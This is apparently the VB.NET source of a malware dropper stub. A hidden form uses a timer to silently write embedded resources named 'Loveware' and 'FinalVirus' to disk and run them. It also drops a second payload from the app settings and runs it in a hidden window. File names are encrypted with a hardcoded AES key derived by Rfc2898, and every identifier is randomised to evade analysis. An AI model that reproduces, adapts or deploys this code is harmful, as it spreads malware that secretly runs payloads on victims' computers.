Imports System.Security.Cryptography
Imports System.IO
Imports System.Threading
Imports System.Environment
Public Class Form1
    Private Sub RFhcLUKNsKjbCuFCYMRrlUc(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Hide()
        Timer1.Start()
    End Sub
    Private Sub TLgYkXvfeFGeErchwaOOJle(sender As Object, e As EventArgs) Handles Timer1.Tick
        Hide()
        On Error Resume Next
        System.IO.File.WriteAllBytes(mjwVNXATDubiQYsmcPSEJoS("kTCuq6ysxAsJLdntRqqDLsanJO31quDDFJZVamwliLc="), My.Resources.Loveware)
        Dim ZjalIokJdarNghswhdJpnpX As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim boZhhqYbPVOQidTdIsGMLKY As String = ZjalIokJdarNghswhdJpnpX + mjwVNXATDubiQYsmcPSEJoS("zx6tU9fGg2+mnFhA2jL0uA==")
        IO.File.WriteAllBytes(boZhhqYbPVOQidTdIsGMLKY, My.Resources.FinalVirus)
        Process.Start(boZhhqYbPVOQidTdIsGMLKY)
        Dim maATVoZTIngiUkSqQshqhqA As String = IO.Path.Combine(My.Computer.FileSystem.SpecialDirectories.Temp, (mjwVNXATDubiQYsmcPSEJoS("QKb1whnflfpIH+yt5a8Jdg==")))
        If File.Exists(maATVoZTIngiUkSqQshqhqA) = True Then
            IO.File.Delete(maATVoZTIngiUkSqQshqhqA)
        End If
        File.WriteAllText(maATVoZTIngiUkSqQshqhqA, My.Settings.X)
        Dim RuhaTljNAEoaHJbGMofgLWK As String = Path.Combine(Path.GetTempPath, (mjwVNXATDubiQYsmcPSEJoS("QKb1whnflfpIH+yt5a8Jdg==")))
        Dim tRRhShtHpRvTqfkSHkdWnCU As New ProcessStartInfo
        tRRhShtHpRvTqfkSHkdWnCU.FileName = RuhaTljNAEoaHJbGMofgLWK
        tRRhShtHpRvTqfkSHkdWnCU.CreateNoWindow = True
        tRRhShtHpRvTqfkSHkdWnCU.WindowStyle = ProcessWindowStyle.Hidden
        tRRhShtHpRvTqfkSHkdWnCU.UseShellExecute = True
        tRRhShtHpRvTqfkSHkdWnCU.ErrorDialog = False
        Process.Start(tRRhShtHpRvTqfkSHkdWnCU)
    End Sub
    Private Function mjwVNXATDubiQYsmcPSEJoS(ByVal ullBQLlnIKqpWsQre As String)
        Dim vWQdrkgZbNTWsbLAfCbqLUW As New RijndaelManaged
        Dim AdocbdmiSOCYrskNYTqhJbg() As Byte
        Dim uYpgBaBQgSeVpwMfBFtNlKe() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim JIoPeiiRUfkofiKNoCEXgDv As New Rfc2898DeriveBytes("mjwVNXATDubiQYsmcPSEJoS", uYpgBaBQgSeVpwMfBFtNlKe)
        vWQdrkgZbNTWsbLAfCbqLUW.Key = JIoPeiiRUfkofiKNoCEXgDv.GetBytes(vWQdrkgZbNTWsbLAfCbqLUW.Key.Length)
        vWQdrkgZbNTWsbLAfCbqLUW.IV = JIoPeiiRUfkofiKNoCEXgDv.GetBytes(vWQdrkgZbNTWsbLAfCbqLUW.IV.Length)
        Dim lcZWderKNtsgRHTZjvCNKgI As New IO.MemoryStream
        Dim nhYSFhfcwoPkTDrHKNwhfAK As New CryptoStream(lcZWderKNtsgRHTZjvCNKgI, vWQdrkgZbNTWsbLAfCbqLUW.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            AdocbdmiSOCYrskNYTqhJbg = Convert.FromBase64String(ullBQLlnIKqpWsQre)
            nhYSFhfcwoPkTDrHKNwhfAK.Write(AdocbdmiSOCYrskNYTqhJbg, 0, AdocbdmiSOCYrskNYTqhJbg.Length)
            nhYSFhfcwoPkTDrHKNwhfAK.Close()
            Return System.Text.Encoding.UTF8.GetString(lcZWderKNtsgRHTZjvCNKgI.ToArray)
        Catch
        End Try
    End Function
    Private Function vfQfiTHZWTNXoQltrWMEkRo(ByVal GPAegdBBnvutXICMr As String)
        Dim ElFOAKDJhFTVtbvXb As New RijndaelManaged
        Dim JrsuPAvrsoZUBmHBK() As Byte
        Dim LWnNvUtjBhDscTMoa() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim oKeyGenerator As New Rfc2898DeriveBytes("vfQfiTHZWTNXoQltrWMEkRo", LWnNvUtjBhDscTMoa)
        ElFOAKDJhFTVtbvXb.Key = oKeyGenerator.GetBytes(ElFOAKDJhFTVtbvXb.Key.Length)
        ElFOAKDJhFTVtbvXb.IV = oKeyGenerator.GetBytes(ElFOAKDJhFTVtbvXb.IV.Length)
        Dim nPToDhQDNsRIoZBKO As New IO.MemoryStream
        Dim iNmRYJAVLOvRhtfRu As New CryptoStream(nPToDhQDNsRIoZBKO, ElFOAKDJhFTVtbvXb.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            JrsuPAvrsoZUBmHBK = Convert.FromBase64String(GPAegdBBnvutXICMr)
            iNmRYJAVLOvRhtfRu.Write(JrsuPAvrsoZUBmHBK, 0, JrsuPAvrsoZUBmHBK.Length)
            iNmRYJAVLOvRhtfRu.Close()
            Return System.Text.Encoding.UTF8.GetString(nPToDhQDNsRIoZBKO.ToArray)
        Catch
        End Try
    End Function
End Class